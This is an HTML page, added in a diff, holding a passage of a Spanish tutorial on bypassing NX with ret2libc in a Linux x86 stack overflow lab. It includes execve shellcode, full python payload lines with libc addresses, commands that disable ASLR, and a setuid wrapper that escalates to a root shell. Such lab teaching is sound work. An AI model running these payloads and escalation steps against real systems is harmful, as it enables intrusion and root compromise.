@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Desbordando El Buffer en Linux X86 (IV) - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by hdbreakerEn el anterior tutorial se logro ejecutar código arbitrario saltando la protección ASLR por medio de llamadas a funciones definidas, pero &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Desbordando El Buffer en Linux X86 (IV)</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-12-18T13:53:00-08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:53 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-PXX_Zzy6xbM/VlZ88EuyFeI/AAAAAAAAAtA/u7AZAVesZ1o/s1600/Captura%2Bde%2BTela%2B2013-09-10%2Ba%25CC%2580s%2B01.30.53.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="443" src="http://3.bp.blogspot.com/-PXX_Zzy6xbM/VlZ88EuyFeI/AAAAAAAAAtA/u7AZAVesZ1o/s640/Captura%2Bde%2BTela%2B2013-09-10%2Ba%25CC%2580s%2B01.30.53.png" width="640" /></a></div><br /><div style="text-align: right;"><b>by hdbreaker</b></div><br />En el <a href="http://www.securitysignal.org/2015/01/desbordando-el-buffer-en-linux-x86-iii_14.html">anterior</a> tutorial se logro ejecutar código arbitrario saltando la protección ASLR por medio de llamadas a funciones definidas, pero en nuestro ejemplo<br /><a name='more'></a> nos veíamos obligados a desactivar el flag NX (Non-Exec).<br /><br />Non-Exec es una protección de memoria que indica cuales sectores de la misma son aptos para la ejecución de código y cuales secciones son solo para almacenamiento de datos.<br /><br />En esta cuarta parte de nuestros talleres para aprender a explotar el buffer en sistemas Linux x86 trataremos de forma práctica cómo bypassear la protección NX (Non-Exec) por medio de <b>ret2libc</b>.<br /><br />Esta entrega es algo larga y esto puede volverla un poco tediosa, se recomienda tener conocimientos previos en el tema, o como mínimo haber leído y resuelto las entregas anteriores. He intentado explicar la técnica de la forma más clara posible, les recomiendo releer todas la veces que sea necesario.<br /><br />Para comprender el funcionamiento de memoria junto a la protección NX, nos basaremos en la siguiente imagen:<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-lNANbPMrFbw/VlaBki2Sw7I/AAAAAAAAAtM/em60GdG_S-Y/s1600/image.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="350" src="http://2.bp.blogspot.com/-lNANbPMrFbw/VlaBki2Sw7I/AAAAAAAAAtM/em60GdG_S-Y/s400/image.png" width="400" /></a></div><div style="text-align: center;"><br /></div><div><br /></div>Supongamos que logramos overflodear nuestro Espacio de Variables, logrando escribir sobre ESP y posteriormente controlar el flujo logrando modificar EIP.<br /><br />Todo indicaría que podríamos apuntar EIP hacia nuestro Shellcode dentro de ESP y de esta forma lograr ejecutar código arbitrariamente.<br /><br />Como vimos en entradas anteriores, esto funcionaría si la sección de ESP no estuviera protegida por el flag Non-Exec (NX).<br /><div><br /></div><div>En este ejemplo nuestro código va a ser compilado con la protección NX, por lo que aun que logremos escribir bytes dentro de ESP al momento de dirigir EIP hacia&nbsp;la sección de ESP donde se encuentre nuestro Shellcode, la misma al estar marcada como No Ejecutable va a pasar por alto la ejecución de los bytes.  <br /><br />Código:<br /><br /><pre class="brush: cpp">#include &lt;stdlib.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;string.h&gt;<br /><br />int main(int argc, char *argv[]) {<br /><br />    char buffer[100];<br /><br />    strcpy(buffer, argv[1]);<br /><br />    printf("%s\n",buffer);<br /><br />    return 0;<br />}<br /></pre><div><br /></div><br />Para centrarnos sólo en superar la protección NX desactivaremos ASLR:<br /><br /><pre class="brush: bash">echo 0 &gt; /proc/sys/kernel/randomize_va_space<br /></pre><br />Y luego compilaremos de la siguiente forma:  <br /><br /><pre class="brush: bash">gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -ggdb pwn.c -o pwn<br /></pre><br />luego asignamos permisos de root al binario y ponemos activo el bit SUID<br /><br /><b>chown root pwn</b><br /><b>chgrp root pwn</b><br /><b>chmod +s pwn</b><br /><br />El flag -m32 indica que se debe compilar para la arquitectura x86 (ya que mi pc es x64 debo incluir este flag)<br /><br />Si analizamos la forma de compilar vemos que se ha eliminado el flag <b>-z execstack</b>&nbsp;este flag es el encargado de eliminar la protección NX, al no colocarlo como parámetro de gcc el binario se compilará utilizando esta protección.<br /><br />En este momento dividiremos la entrada en 2 partes, realizaremos una explotación tradicional del binario con el fin de demostrar el funcionamiento de NX y posteriormente saltaremos esta protección por medio de <b>ret2libc.</b><br /><b><br /></b><b>Explotación Tradicional:</b><br /><br />Iniciamos gdb e intentamos desbordar el buffer utilizando pyhton:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-bKbmIN_DElE/VlaOby44YAI/AAAAAAAAAts/r62BMlIPIsQ/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B01%253A45%253A06.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-bKbmIN_DElE/VlaOby44YAI/AAAAAAAAAts/r62BMlIPIsQ/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B01%253A45%253A06.png" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Observamos que a partir del caracter número 105 comenzamos a sobrescribir EIP:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-tNKlVeYeyf4/VlaOBTwlemI/AAAAAAAAAtk/rC8281HRgbM/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B01%253A43%253A31.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="54" src="http://4.bp.blogspot.com/-tNKlVeYeyf4/VlaOBTwlemI/AAAAAAAAAtk/rC8281HRgbM/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B01%253A43%253A31.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">En este punto sabemos que poseemos un espacio de 104 bytes para agregar nuestro Shellcode, para asegurarnos el correcto flujo de ejecución agregaremos algunos NOPS (\x90) antes de nuestro shellcode con el fin de completar el espacio necesario para que nuestro byte 105 sobre escriba EIP (Esto se denomina NOPSLEED).<br /><br />Para nuestro ejemplo utilizaremos el siguiente Shellcode de 24 Bytes y preparado para brindarnos una shell en arquitectura x86:</div><div style="text-align: left;"><br /><pre class="brush: cpp">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80<br /></pre></div><div style="text-align: left;"><br />Sabiendo que debemos completar 104 bytes para quedar en el pie de EIP, y que nuestra shellcode es de 24 bytes, nuestro <b>nopsleed</b> debe calcularse como: <b>104 - 24 = 80 bytes</b><br /><br />Dando como resultado:<br /><br /><b>python -c "print '\x90'*80+'Shellcode'+'EIPOverflow'"</b><br /><b><br /></b>Ahora nos falta obtener la dirección de memoria de nuestro payload, para esto utilizamos gdb para correr el binario enviando como parámetro nuestro payload:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-tosGyMScQEA/VlaTA9A9HPI/AAAAAAAAAt4/vvgP9XEuu8U/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A04%253A48.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="58" src="http://4.bp.blogspot.com/-tosGyMScQEA/VlaTA9A9HPI/AAAAAAAAAt4/vvgP9XEuu8U/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A04%253A48.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Como podemos observar hemos sobre escrito EIP de forma correcta, ahora inspeccionaremos ESP hasta encontrar alguna sección de nuestro NOPSLEED:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-t4zribF1Mc4/VlaTzT6PwuI/AAAAAAAAAuI/eacm0eyQUPA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A08%253A09.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="136" src="http://2.bp.blogspot.com/-t4zribF1Mc4/VlaTzT6PwuI/AAAAAAAAAuI/eacm0eyQUPA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A08%253A09.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-JJr2DLJ7NvY/VlaT-lq93wI/AAAAAAAAAuQ/MpPpKhg_QoY/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A09%253A06.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="120" src="http://1.bp.blogspot.com/-JJr2DLJ7NvY/VlaT-lq93wI/AAAAAAAAAuQ/MpPpKhg_QoY/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A09%253A06.png" width="640" /></a></div><div style="text-align: center;"><br /></div>&nbsp;Podemos observar que en la dirección de memoria: <b>0xffffd17c &nbsp;</b>aparecen parte de nuestros NOPs.<br /><br />Al final de nuestro payload colocaremos esta dirección de memoria respetando Little Endian:<br /><br /><pre class="brush: bash">python -c "print '\x90'*80+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'+'\x7c\xd1\xff\xff'"<br /></pre><br />Si enviamos nuestro payload nuevamente:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-ybI7FxwGn2Y/VlaVPuK498I/AAAAAAAAAuc/liEgyIZitjg/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A14%253A19.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="60" src="http://3.bp.blogspot.com/-ybI7FxwGn2Y/VlaVPuK498I/AAAAAAAAAuc/liEgyIZitjg/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A14%253A19.png" width="640" /></a></div><div style="text-align: center;"><br /></div><br /><b>QUE HA SUCEDIDO? POR QUE NO TENEMOS NUESTRA SHELL?</b><br /><br />Si compilamos el mismo programa desactivando la protección NX y enviamos el mismo payload, observamos que obtenemos nuestro preciado shell:<br /><br /><pre class="brush: bash">gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -ggdb -z execstack pwn.c -o pwn2<br /></pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-PjfBnXw_Pjc/VlaV1xC57eI/AAAAAAAAAuk/ciOj28P98JM/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A16%253A48.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="46" src="http://2.bp.blogspot.com/-PjfBnXw_Pjc/VlaV1xC57eI/AAAAAAAAAuk/ciOj28P98JM/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A16%253A48.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Esto se debe a que la protección NX está haciendo de las suyas y nos impide ejecutar código arbitrario alojado en el espacio de memoria ESP.<br /><br /></div><div style="text-align: center;"><b>Retomando el hilo principal de la entrada: Como saltamos la protección NX?</b></div><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;">Para lograr sortear esta protección, nos valdremos de funciones residentes en <b>libc </b>que estén por defecto marcadas como espacios de memoria ejecutable.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Un ejemplo es la función <a href="http://www.gnu.org/software/libc/manual/html_node/Running-a-Command.html">system()</a>&nbsp;de libc, la cual recibe como parámetro un <b>string </b>que posteriormente ejecuta:<br /><br />Siguiendo esta perspectiva nosotros trataremos de realizar desde nuestro payload una llamada a <b>system() </b>enviando como argumento <b>/bin/bash ( "system(/bin/bash)</b>" ).</div><div style="text-align: left;"><br /></div><div style="text-align: left;"></div><div style="text-align: center;"><b>Muy bien, en este punto debo haber captado su atención.</b></div><br />Otro punto a tener en cuenta es que al finalizar la llamada a la función <b>system()</b> nosotros debemos indicar hacia dónde debemos retornar, siendo ésta la dirección próxima funcional de nuestro binario, ya que de otra forma al finalizar <b>system(), EIP </b>no sabría hacia dónde continuar y el programa crashearía dejando logs en el sistema explotado.<br /><br />Como obtener una dirección de memoria próxima funcional suele ser bastante complejo teniendo en cuenta que el programa puede fallar en cualquier momento por la sobre escritura de variables, le dejaremos este trabajo a otra función de libc: <b>exit()</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">La función <b>exit()</b>&nbsp;realiza una salida limpia de la ejecución e inmediatamente realiza un <b>RET</b>&nbsp;hacia la ultima dirección de memoria válida con el fin de continuar el flujo de ejecución de un programa.<br /><br />Para dejarlo claro:<br /><br />Si el Programa A internamente llama a la ejecución del Programa B, al finalizar B (exit), retornará a la próxima linea funcional de A, para que A pueda por ej, utilizar el output de B para algún proceso propio.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Teniendo en cuenta esto nuestro nuevo payload quedaría de esta forma:<br /><br /><b></b><br /><pre class="brush: bash"><b>python -c "print 'nopsleed'+'system()'+'exit()'+'/bin/bash'"<br /></b></pre></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Por extraño que parezca, primero debemos indicar system(), luego la función de retorno, y al final el parámetro que ejecutará system().</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Obviamente <b>libc </b>al ser una librería del sistema se incluye por defecto al ejecutar un binario, y sus funciones pasan a ser punteros de memoria hacia dichas funciones.<br /><br />Dicho de otra forma system(), exit() y /bin/bash son direcciones de memoria que incluiremos en nuestro payload, dicho esto la pregunta lógica es:<br /><br /><div style="text-align: center;"><b>Como obtengo las direcciones de system() y exit()?</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Para esto nos ayudaremos de nuestro querido amigo gdb. Dado que las funciones de <b>libc </b>son importadas al momento de ejecución, lo primero que haremos es colocar un breakpoint en el cuerpo principal del binario:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-QBV_FzlR1ik/Vlafzkd0GSI/AAAAAAAAAu0/9i5DuVM-N4Y/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A59%253A25.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="46" src="http://1.bp.blogspot.com/-QBV_FzlR1ik/Vlafzkd0GSI/AAAAAAAAAu0/9i5DuVM-N4Y/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A59%253A25.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Luego de esto procedemos a ejecutar:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-R7zNUWhdlgo/VlagBLOnLyI/AAAAAAAAAu8/qGvFOo4e3Ro/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A00%253A26.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="126" src="http://1.bp.blogspot.com/-R7zNUWhdlgo/VlagBLOnLyI/AAAAAAAAAu8/qGvFOo4e3Ro/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A00%253A26.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">En este punto somos capaces de obtener la dirección de memoria de system() y de exit() colocando breakpoints o printeando los nombres de dichas funciones:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-3bD61ymfhhk/VlagYddvN2I/AAAAAAAAAvE/sWyYyNkmzNc/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A01%253A50.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="116" src="http://3.bp.blogspot.com/-3bD61ymfhhk/VlagYddvN2I/AAAAAAAAAvE/sWyYyNkmzNc/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A01%253A50.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Con esto podemos concluir que las direcciones de memoria correspondientes son:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b>system(): 0xf7e3e190</b></div><div style="text-align: left;"><b>exit(): &nbsp; &nbsp; &nbsp;0xf7e311e0</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Ahora sólo nos falta el parámetro que debe ejecutar <b>system(), éste es el paso más importante y por el cual mucha gente no termina de entender el funcionamiento de ret2libc</b>.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Siendo "/bin/bash" un string, nosotros debemos obtener el mismo desde algún lugar de memoria, sea este string parte del código del programa (cosa poco probable) o desde un puntero a una variable de entorno.<br /><br />Yo soy partidario de utilizar una variable customizada con el fin de inyectarla en tiempo de ejecución en el binario y poder utilizarla desde allí, a este procedimiento se le conoce como<b> EGGSTERING o EGG HUNTING</b>, por los famosos easter egg de distintos programas que utilizaban variables de entorno para validar y ejecutar mensajes ocultos o niveles superiores de administración.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Procederemos a crear nuestra variable de entorno:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-_-dw5OGm0PY/VlaimYPAcJI/AAAAAAAAAvM/iDRMBW0Yj94/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A11%253A22.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="62" src="http://2.bp.blogspot.com/-_-dw5OGm0PY/VlaimYPAcJI/AAAAAAAAAvM/iDRMBW0Yj94/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A11%253A22.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Una vez creada nuestra variable de entorno, procederemos a obtener su dirección de memoria desde gdb:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-ukb-PYoPLm8/VlajG1wi3RI/AAAAAAAAAvU/Ut9ldXeIHBg/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A13%253A27.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="160" src="http://3.bp.blogspot.com/-ukb-PYoPLm8/VlajG1wi3RI/AAAAAAAAAvU/Ut9ldXeIHBg/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A13%253A27.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">En este momento somos capaces de buscar en las variables de entorno inyectadas al binario en tiempo de ejecución.<br /><br />Las variables de entorno se encuentran finalizando la sección de ESP:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-1t-lXJPBx9A/Vlajg97FFXI/AAAAAAAAAvc/FD0WJGarZ7o/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A15%253A13.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="46" src="http://2.bp.blogspot.com/-1t-lXJPBx9A/Vlajg97FFXI/AAAAAAAAAvc/FD0WJGarZ7o/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A15%253A13.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Utilizamos <b>"s" </b>ya que las variables de entorno son del tipo string, y esto nos permite visualizar de forma correcta los strings dentro de un binario.</div><div style="text-align: left;">Continuamos hasta llegar a la zona:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-0II6-Kx95-I/VlakGC4QlgI/AAAAAAAAAvo/pZcPPDrhbX8/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A17%253A38.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="88" src="http://1.bp.blogspot.com/-0II6-Kx95-I/VlakGC4QlgI/AAAAAAAAAvo/pZcPPDrhbX8/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A17%253A38.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Como podemos observar nuestra variable EGG se encuentra en: <b>0xffffd417</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;"><b>Y he aquí el error de la mayoría! </b>Muchos utilizan esta dirección de memoria sin comprender que le estaremos pasando como parámetro a system(): EGG=/bin/bash<br /><br />Mejor dicho: <b>system(EGG=/bin/bash)</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">El comando EGG=/bin/bash, no existe, por lo que debemos enviar como parámetro de system() la porción de la variable de entorno que comience con<span style="color: red;"> </span><b><span style="color: red;">/ </span>(0x2f en hexa)</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Para obtener la dirección exacta de este caracter utilizamos gdb inspeccionando byte a byte la cadena alojada en: <b>0xffffd417 </b>hasta llegar al primer <b>0x2f</b></div><div style="text-align: left;"><b><br /></b></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-XqxxmVP7YYg/VlalrGt2rMI/AAAAAAAAAv0/_agsPzq0oIY/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A24%253A28.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="241" src="http://3.bp.blogspot.com/-XqxxmVP7YYg/VlalrGt2rMI/AAAAAAAAAv0/_agsPzq0oIY/s400/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A24%253A28.png" width="400" /></a></div><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;">En este paso obtenemos la dirección real de <b>/bin/bash: 0xffffd41b</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Ahora estamos listos para generar un payload <b>ret2libc </b>válido <b>para gdb:</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Ya que estamos trabajando con varias direcciones de memoria y esto hace factible que nos equivoquemos al convertir al Little Endian, dejaremos que python se ocupe de esto, haciendo uso de la librería struct, quedando nuestro payload:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><pre class="brush: py">python -c "import struct; print '\x90'*104+struct.pack('&lt;I', 0xf7e3e190)+struct.pack('&lt;I', 0xf7e311e0)+struct.pack('&lt;I', 0xffffd41b)<i 0xf7e311e0="" 0xf7e3e190="" 0xffffd41b="" pre="" struct.pack=""><br /></i></pre></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b>El resultado:</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-vhXRo7KDPkk/VlaramG7PCI/AAAAAAAAAwE/P3cJEkJWvQ8/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A48%253A43.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="28" src="http://4.bp.blogspot.com/-vhXRo7KDPkk/VlaramG7PCI/AAAAAAAAAwE/P3cJEkJWvQ8/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B03%253A48%253A43.png" width="640" /></a></div><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;">Obtenemos de forma correcta nuestra shell saltando la protección NX.</div><div style="text-align: left;"><br /><div style="text-align: center;"><b>Pero... por qué nuestra shell no corre con permisos de root?</b></div><b><br /></b>Esto ocurre ya que la función system() dropea los privilegios de SUID, system ejecuta un comando como si nosotros lo hicieramos por medio de la terminal /bin/bash, y al detectar la creación de un proceso hijo, dropea los permisos como una medida de seguridad.<br /><br />Para lograr bypassear esta protección existen 2 tecnicas:<br /><br />1) Crear un binario intermediario que nos devuelva los permisos de root y lance por medio de una función sin protecciones nuestra shell.<br /><br />2) No utilizar system() y utilizar una función sin protecciones para lanzar nuestra shell.<br /><br />En ambos casos utilizaremos la función execve(), la diferencia radica en que si seguimos por el camino número 2, deberemos escapear de forma correcta todos los argumentos requeridos por execve desde ASM y esto se vuelve algo tedioso si nos encontramos con badchars.<br /><br />En el primer caso (del cual trata esta entrada), escribiremos un pequeño programa que canalizará la ejecución de execv() por medio de C trabajando de esta manera a más alto nivel y por consecuencia de una forma más legible.<br /><br />Lo primero que debemos hacer es obtener nuevamente nuestros permisos de root, esto lo logramos con:<br /><br /><b>setuid(0) y setgid(0)</b><br /><br />quedando nuestro código de la siguiente forma:<br /><br /><pre class="brush: cpp">//wrapper.c</pre><pre class="brush: cpp">#include &lt;stdio.h&gt;<br />#include &lt;string.h&gt;<br /><br />int main ()<br />{<br /><br />   setuid(0);<br />   setgid(0);<br />   execve("/bin/sh", NULL, NULL);<br /><br />   return(0);<br />}</pre><br />Compilamos y obtenemos nuestro binario con <b>gcc wrapper.c -o wrapper</b>&nbsp;y al ejecutarlo observamos cómo esto nos devuelve una shell sin privilegios.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-RpTLyIZJQcc/VnRrJtg0zUI/AAAAAAAAAwU/SG8qGXnYXHY/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A22%253A35.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="30" src="http://4.bp.blogspot.com/-RpTLyIZJQcc/VnRrJtg0zUI/AAAAAAAAAwU/SG8qGXnYXHY/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-18%2B17%253A22%253A35.png" width="640" /></a></div><br /><b><br /></b></div><div style="text-align: right;"><div style="text-align: left;"></div><div style="text-align: center;"><b>Dónde esta el secreto de todo esto? Cómo obtendremos permisos de root?</b></div><br /><br /><div style="text-align: left;">Desde nuestro binario vulnerable, el cual tiene el bit SUID activo, llamaremos por medio de system() a nuestro <b>wrapper</b>, <b>system()</b> dropeará nuestros privilegios, pero al ejecutar <b>wrapper </b>con el bit SUID, éste <b>momentáneamente</b> tendrá permisos para ejecutar <b>setuid(0)</b> y <b>setgrp(0)</b> volviendo a elevar sus privilegios y lanzando con <b>execv()</b> nuestra shell, pero ahora con permisos de <b>root!</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Para lograr esto, seguiremos el proceso de explotación de ret2libc, pero en nuestra variable de entorno realizaremos un llamado a nuestro binario intermedio: <b>wrapper</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;"><b></b></div><div style="text-align: left;"><b>$ export EGG='./wrapper'</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Seguido a esto, buscaremos realizar la explotación por fuera de gdb, dado que gdb encapsula la ejecución y es poco probable que logremos obtener una shell root.<br /><br />Dado que <b>ASLR </b>esta desactivado, las direcciones de memoria de system() y de exit() se mantendrán, pero la dirección de nuestra variable de entorno cambiará, para obtenerla nos ayudaremos de la función <b>getenv() </b>de C.<br 